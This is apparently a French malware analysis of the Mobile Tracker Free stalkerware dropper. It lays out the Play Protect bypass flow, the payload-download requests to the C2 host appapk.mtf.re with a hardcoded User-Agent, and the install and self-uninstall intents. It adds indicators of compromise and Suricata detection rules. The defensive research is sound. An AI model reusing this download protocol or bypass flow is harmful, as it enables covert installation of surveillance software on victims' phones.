# Mobile Tracker Free — Dropper v2.7 — Analyse complète

> **Package** : `com.mtf.download`
> **Version** : 2.7 (versionCode 26)
> **Target SDK** : 34 (Android 14)
> **Min SDK** : 21 (Android 5.0)
> **Obfuscation** : ProGuard — packages renommés (`p009J`, `p010K`, `p053p`, etc.)
> **Application** : `com.service.downloadapp.AppMain`
> **Outil** : JADX MCP
> **Date d'analyse** : 2026-04-09

---

## 1. Identification

L'APK est le **dropper officiel** de **Mobile Tracker Free** (MTF), un stalkerware commercial. Le nom affiché à l'utilisateur est `"Download Mobile Tracker Free"`. Le rôle exclusif de cet APK est de guider l'utilisateur à travers la désactivation des protections Android, puis de télécharger et installer le véritable APK stalkerware depuis un serveur distant.

Le package `com.mtf.download` encode le nom du produit : **M**obile **T**racker **F**ree.

---

## 2. Manifest — Permissions et composants

### 2.1 Permissions

| Permission | Usage |
|------------|-------|
| `INTERNET` | Téléchargement de l'APK stalkerware |
| `ACCESS_NETWORK_STATE` | Vérification de connectivité avant download |
| `REQUEST_INSTALL_PACKAGES` | **Installation silencieuse** de l'APK téléchargé |
| `REQUEST_DELETE_PACKAGES` | Auto-désinstallation du dropper après installation |
| `WRITE_EXTERNAL_STORAGE` (≤18) | Écriture APK sur stockage (legacy) |
| `READ_EXTERNAL_STORAGE` (≤18) | Lecture APK sur stockage (legacy) |

### 2.2 Composants

| Composant | Type | Rôle |
|-----------|------|------|
| `AppMainActivity` | Activity (LAUNCHER) | Écran principal — guide la désactivation des protections |
| `DownloadAPPActivity` | Activity | Téléchargement et installation de l'APK stalkerware |
| `AppMain` | Application | Singleton, référence globale au contexte |
| `FileProvider` | Provider | Partage de l'APK via `content://` URI (API 24+) |
| `GoogleApiActivity` | Activity (translucide) | Google Play Services / SafetyNet |

### 2.3 Observations stealth

- `allowBackup="false"` — empêche l'extraction de données via ADB backup
- Permission custom `DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION` (protectionLevel=signature) — empêche l'interception des broadcasts internes
- Google Play Services intégré (SafetyNet) — pour vérifier l'état de Play Protect

---

## 3. Serveur C2 et protocole réseau

### 3.1 URL de base

```
https://appapk.mtf.re/
```

Stockée dans la ressource string `my_url` (ID `0x7f1000b9`).

Le domaine `mtf.re` utilise le ccTLD `.re` (Île de la Réunion).

### 3.2 Endpoint de téléchargement

Le dropper effectue deux requêtes :

**Étape 1 — Récupération de l'URL de l'APK** :
```
POST https://appapk.mtf.re/getURLFTP.php
Headers:
  User-Agent: KABNKNHFFHDHYD58698347556988AD89GH2020
  Accept-Language: UTF-8
  Connection: close
Body: paramètres HashMap (architecture, etc.)
Response: JSON contenant l'URL de téléchargement
```

**Étape 2 — Téléchargement du payload** :
```
POST https://appapk.mtf.re/{url_from_json}
Headers:
  User-Agent: KABNKNHFFHDHYD58698347556988AD89GH2020
  Accept-Language: UTF-8
  Connection: close
Response: streaming (ResponseBody → app.apk)
```

### 3.3 User-Agent custom

```
KABNKNHFFHDHYD58698347556988AD89GH2020
```

Chaîne hardcodée dans l'interface Retrofit `InterfaceC0103c`. Le suffixe `2020` pourrait indiquer l'année de création du protocole.

### 3.4 Client HTTP

- **OkHttp** + **Retrofit** (proxy dynamique Java)
- Timeouts : 30s connect / 30s read / 30s write
- `HttpLoggingInterceptor` (Level.BODY) — laissé en mode debug (erreur OPSEC)
- Intercepteur réseau custom `C0101a` → wrapping du `ResponseBody` avec `C0105e` pour tracking de progression du download
- Sélection d'architecture : détection **ARM** (`armeabi`) via `Build.SUPPORTED_ABIS`, sélection de la variante APK correspondante

### 3.5 Classe réseau — `AbstractC1561a.m1684s()`

Méthode centrale de récupération d'URL :
1. Lit `R.string.my_url` → `https://appapk.mtf.re/`
2. Construit un client Retrofit avec OkHttp
3. Appelle `getURLFTP.php` avec des paramètres HashMap
4. Parse la réponse JSON
5. Retourne un `JSONObject` contenant l'URL FTP/download du vrai APK

---

## 4. Flow d'infection — Kill chain du dropper

### 4.1 Écran principal (`AppMainActivity`)

L'écran affiche 3 `SwitchMaterial` guidant l'utilisateur :

| Switch | Champ | Action déclenchée |
|--------|-------|-------------------|
| Play Protect (`f813a`) | `switchSettingPP` | Ouvre `com.google.android.gms.security.settings.VerifyAppsSettingsActivity` pour désactiver Play Protect |
| Notifications GP (`f814b`) | `switchSettingGPNotif` | Redirige vers `APP_NOTIFICATION_SETTINGS` de `com.android.vending` (Google Play Store) |
| Sources inconnues (`f815c`) | `switchSettingUnknownSources` | Ouvre `MANAGE_UNKNOWN_APP_SOURCES` pour autoriser l'installation |

**Textes de guidance** (classe `C0088c`) :
- *"Disable Google Play Protect, otherwise the application will be uninstalled."*
- *"Disable notifications related to Google Play Protect."* + *"Select 'Security and errors' => Turn OFF"*
- *"You must allow the app to install another application."*

### 4.2 Vérification SafetyNet (`C0091f`)

Le dropper utilise **Google Play Services SafetyNet API** (task code 4201) pour vérifier programmatiquement si Google Play Protect est effectivement désactivé. Le callback vérifie `Status.f573c` et le flag `f1525d` pour déterminer l'état réel (pas juste l'état du switch UI).

### 4.3 Bouton Download — conditions

Le bouton `button_download` (`AppMainActivity.onClick()`) vérifie :
1. Si Play Protect est désactivé → sinon erreur `settings_google_verifier_info_error`
2. Si les sources inconnues sont activées (API 26+ : `canRequestPackageInstalls()`) → sinon erreur `settings_unknow_sources_info_error`

Si OK : `Intent` vers `DownloadAPPActivity` avec flags `FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TASK`.

### 4.4 Téléchargement (`DownloadAPPActivity`)

1. `ProgressDialog` — *"The download of the apk is in progress…"*
2. Détection d'architecture ARM via `Build.SUPPORTED_ABIS` → sélection variante
3. Thread `RunnableC0095j` lance le download
4. `RunnableC0097l` : POST vers `getURLFTP.php` → récupération JSON → POST streaming du payload
5. Écriture dans `{externalFilesDir}/Download/app.apk`
6. Affichage timestamp de fin via `SimpleDateFormat("yyyy/MM/dd HH:mm:ss")`

### 4.5 Installation du payload (`ViewOnClickListenerC0093h`)

Bouton "INSTALL Mobile Tracker Free" :

1. Construit le chemin `{externalFilesDir}/Download/app.apk`
2. API 24+ : `FileProvider.getUriForFile()` avec authority `com.mtf.download.provider`
3. API < 24 : `Uri.fromFile()` direct
4. `Intent(ACTION_INSTALL_PACKAGE)` + `FLAG_ACTIVITY_NEW_TASK` + `FLAG_GRANT_READ_URI_PERMISSION`
5. Post-install : cache le bouton install, affiche le bouton uninstall
6. Message : *"Mobile Tracker Free app is installed. You can now uninstall this application."*

### 4.6 Auto-désinstallation (`AbstractC1561a.m1658M()`)

```java
Intent("android.intent.action.UNINSTALL_PACKAGE")
  .setData(Uri.parse("package:" + context.getPackageName()))
  .putExtra("android.intent.extra.RETURN_RESULT", true)
```

Le dropper se désinstalle, ne laissant **aucune trace visible** du mécanisme d'installation.

---

## 5. Kill chain résumée

```
[1] Victime reçoit un lien vers le dropper (APK ou site web)
    ↓
[2] Dropper s'installe — nom anodin "Download Mobile Tracker Free"
    ↓
[3] Écran de "configuration" guide l'abuseur :
    ├── Désactiver Google Play Protect
    ├── Désactiver les notifications Play Protect
    └── Activer les sources inconnues
    ↓
[4] Vérification SafetyNet que Play Protect est OFF
    ↓
[5] POST → https://appapk.mtf.re/getURLFTP.php
    ↓ JSON response avec URL du payload
[6] POST → téléchargement streaming de l'APK stalkerware
    ↓ app.apk (variante ARM/x86)
[7] Installation via Intent ACTION_INSTALL_PACKAGE
    ↓
[8] Auto-désinstallation du dropper
    ↓
[9] Stalkerware MTF actif — dropper disparu — aucune trace
```

---

## 6. Indicateurs de compromission (IoC)

### 6.1 Réseau

| Indicateur | Type | Détails |
|------------|------|---------|
| `appapk.mtf.re` | Domaine C2 | Serveur de distribution APK |
| `https://appapk.mtf.re/` | URL base | Endpoint du dropper |
| `https://appapk.mtf.re/getURLFTP.php` | URL endpoint | Récupération URL payload |
| `KABNKNHFFHDHYD58698347556988AD89GH2020` | User-Agent | Identifiant unique du dropper MTF |

### 6.2 Hôte

| Indicateur | Type | Détails |
|------------|------|---------|
| `com.mtf.download` | Package name | Dropper MTF |
| `com.service.downloadapp.AppMain` | Application class | Point d'entrée |
| `com.service.downloadapp.AppMainActivity` | Launcher activity | Écran de configuration |
| `com.service.downloadapp.DownloadAPPActivity` | Activity | Download du payload |
| `com.mtf.download.provider` | FileProvider authority | Distribution interne du payload |
| `{externalFilesDir}/Download/app.apk` | Fichier | Payload téléchargé |

### 6.3 Signatures Suricata (proposées)

```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE Mobile Tracker Free Dropper - Custom User-Agent";
    flow:established,to_server;
    http.user_agent;
    content:"KABNKNHFFHDHYD58698347556988AD89GH2020";
    classtype:trojan-activity;
    sid:20260001; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE Mobile Tracker Free Dropper - C2 Domain";
    flow:established,to_server;
    http.host;
    content:"appapk.mtf.re";
    classtype:trojan-activity;
    sid:20260002; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE Mobile Tracker Free Dropper - getURLFTP endpoint";
    flow:established,to_server;
    http.uri;
    content:"getURLFTP.php";
    classtype:trojan-activity;
    sid:20260003; rev:1;
)
```

---

## 7. Vulnérabilités et observations

### 7.1 OPSEC failures de l'opérateur

1. **HttpLoggingInterceptor en mode BODY** laissé dans le build release — fuite de données dans logcat
2. **User-Agent hardcodé unique** → trivial à détecter en réseau
3. **Domaine mtf.re explicite** → attribution directe à Mobile Tracker Free
4. **Strings non obfusquées** → "Download Mobile Tracker Free" en clair dans les ressources
5. **Pas de certificate pinning** → interception MITM possible du téléchargement
6. **Endpoint PHP explicite** (`getURLFTP.php`) → nom de fichier révélateur

### 7.2 Faiblesses de sécurité

1. **Pas de vérification d'intégrité** du payload (pas de hash/signature check de `app.apk`)
2. **Pas de certificate pinning** sur OkHttp → un proxy MITM peut substituer le payload
3. **Stockage externe** pour l'APK (`getExternalFilesDir`) → accessible à d'autres apps (Android < 30)
4. **Timeout généreux** (30s) sans retry logic
5. **Pas de chiffrement du payload** au-delà de HTTPS standard

### 7.3 Anti-analyse

- ProGuard basique (renommage de packages/classes uniquement)
- Pas de détection d'émulateur
- Pas de détection de root/Frida/Xposed
- Pas de vérification de signature de l'APK dropper
- Certaines méthodes échouent à la décompilation JADX (`RunnableC0095j.run()`, `C0091f.mo193c()`) — code smali à investiguer

---

## 8. Contexte — Mobile Tracker Free

Mobile Tracker Free est un stalkerware commercial qui se présente comme un outil de "contrôle parental". Le dropper analysé ici est la **première étape** de la chaîne d'infection :

1. **Dropper** (`com.mtf.download`) ← *ce sample*
2. **Stalkerware principal** (package inconnu, téléchargé depuis `appapk.mtf.re`)

La séparation dropper/payload permet :
- De contourner les détections Google Play Protect (le dropper seul n'a pas de capacités de surveillance)
- De mettre à jour le stalkerware indépendamment du mécanisme de distribution
- De séparer l'infrastructure de distribution de l'infrastructure C2 de surveillance

---

## 9. Mapping des classes obfusquées

| Classe obfusquée | Rôle identifié |
|-------------------|----------------|
| `p009J.C0088c` | Switch change handler (Play Protect, Notifs, Sources inconnues) |
| `p009J.C0091f` | SafetyNet callback — vérification état Play Protect |
| `p009J.C0093h` | OnClickListener — boutons Install/Uninstall |
| `p009J.C0095j` | Runnable — thread principal de download (ARM/x86) |
| `p009J.C0097l` | Runnable — exécution Retrofit download + getURLFTP |
| `p009J.C0089d` | Dialog click → redirect vers notifications Google Play |
| `p010K.C0101a` | OkHttp NetworkInterceptor — wrapping ResponseBody |
| `p010K.C0102b` | Retrofit client builder |
| `p010K.C0103c` | Interface Retrofit — endpoints API (User-Agent hardcodé) |
| `p010K.C0105e` | ResponseBody wrapper — tracking progression download |
| `p053p.AbstractC1561a` | Classe utilitaire géante — contient `m1684s()` (récup URL), `m1658M()` (uninstall), `m1657L()` (check réseau) |

---

## 10. TODO

- [ ] Récupérer le vrai APK stalkerware via `getURLFTP.php` (mock request avec le User-Agent)
- [ ] Analyser le payload MTF principal (même méthodologie que Hoverwatch)
- [ ] Résoudre les domaines/IPs de `mtf.re` et `appapk.mtf.re`
- [ ] Vérifier si le certificat de signature est partagé avec d'autres samples MTF
- [ ] Corréler avec les samples MTF dans le dataset ASTRA
- [ ] Identifier les paramètres HashMap envoyés à `getURLFTP.php` (reverse du smali de `RunnableC0095j.run()`)
- [ ] Analyser le smali de `RunnableC0095j.run()` (décompilation Java échouée)
- [ ] Tester la réponse de `getURLFTP.php` avec curl + UA custom
- [ ] Vérifier les localisations disponibles (répertoires `res/values-*/strings.xml`)
